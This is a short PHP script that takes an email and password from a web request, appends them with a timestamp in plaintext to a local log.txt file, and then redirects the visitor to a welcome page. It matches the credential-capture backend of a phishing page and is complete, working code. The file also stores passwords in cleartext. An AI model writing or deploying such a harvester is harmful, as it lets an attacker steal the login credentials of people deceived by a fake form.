
<?php
date_default_timezone_set("Asia/Tokyo");
$email=$_REQUEST["email"];
$password=$_REQUEST["password"];
$date=date("Y-m-d H:i:s");
$log="date=$date&email=$email&password=$password";
file_put_contents("./log.txt",$log."\n",FILE_APPEND);
?>
<h1>Processing...</h1>
<script>
    location.href="./welcome.html"
</script>